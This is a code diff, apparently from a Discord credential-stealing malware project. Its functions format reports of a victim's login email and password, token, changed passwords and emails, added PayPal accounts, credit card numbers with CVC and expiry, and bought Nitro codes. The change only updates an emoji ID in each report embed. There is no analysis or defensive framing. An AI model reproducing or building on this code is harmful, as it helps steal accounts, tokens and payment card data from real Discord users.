@@ -668,7 +668,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: false,
           },
           {
@@ -707,7 +707,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -746,7 +746,7 @@ const emailChanged = async (email, password, token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -785,7 +785,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **{nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **{nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: false,
           },
           {
@@ -824,7 +824,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -860,12 +860,12 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `<:nitrotype:1083111582684426330> **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
+            value: `<:nitrotype:1083111582684426330> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
